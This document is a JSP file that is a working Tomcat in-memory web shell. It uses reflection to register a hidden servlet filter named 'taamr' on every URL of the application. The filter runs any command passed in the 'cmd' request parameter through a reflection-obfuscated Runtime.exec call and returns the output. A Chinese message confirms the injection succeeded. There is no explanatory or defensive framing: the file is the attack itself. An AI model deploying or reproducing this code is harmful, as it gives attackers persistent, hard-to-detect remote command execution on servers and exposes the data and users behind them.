<%@ page import="org.apache.catalina.Context" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>

<%    
    final String name = "taamr"; //Filter过滤器名字

    ServletContext servletContext = request.getSession().getServletContext();
    Field appctx = servletContext.getClass().getDeclaredField("context");    
    appctx.setAccessible(true);

    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
    Field stdctx = applicationContext.getClass().getDeclaredField("context");    
    stdctx.setAccessible(true);

    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
    Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");    
    Configs.setAccessible(true);    

    Map filterConfigs = (Map) Configs.get(standardContext);

    if (filterConfigs.get(name) == null){
        Filter filter = new Filter() {            
            @Override            
            public void init(FilterConfig filterConfig) throws ServletException {}

            @Override            
            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {

                HttpServletRequest req = (HttpServletRequest) servletRequest;                
                if (req.getParameter("cmd") != null){
                    Process process = null;
                    BufferedReader bufferedReader = null;
                    BufferedReader bufferedReaderError = null;
                    StringBuilder result = new StringBuilder();                    
                    String line ;

                    try {
                        process = (Process) Class.forName("java.lang.Runtime").getMethod("exec", String.class).invoke(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime")),request.getParameter("cmd"));

                        process.waitFor();                        
                        bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream(), "GBK"));

                        bufferedReaderError = new BufferedReader(new InputStreamReader(process.getErrorStream(),"GBK"));

                        while ((line=bufferedReader.readLine())!=null){
                            result.append(line).append("n");                        
                        }

                        while ((line = bufferedReaderError.readLine()) != null) {
                            result.append(line).append('n');                        
                        }

                        servletResponse.setContentType("application/json;charset=UTF-8");                        servletResponse.getWriter().write(result.toString());

                    } catch (Exception e) {
                        e.printStackTrace();                    
                    }finally {
                        bufferedReader.close();                        
                        bufferedReaderError.close();                        
                        process.destroy();                    
                    }                    
                    return;                
                }                
                filterChain.doFilter(servletRequest,servletResponse);            
            }

            @Override            
            public void destroy() {
            }
        };

        FilterDef filterDef = new FilterDef();        
        filterDef.setFilter(filter);        
        filterDef.setFilterName(name);        
        filterDef.setFilterClass(filter.getClass().getName());
        standardContext.addFilterDef(filterDef);

        FilterMap filterMap = new FilterMap();        
        filterMap.addURLPattern("/*");        
        filterMap.setFilterName(name);        
        filterMap.setDispatcher(DispatcherType.REQUEST.name());        
        standardContext.addFilterMapBefore(filterMap); 

        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

        filterConfigs.put(name,filterConfig);

        out.print("注入成功");
    }
%>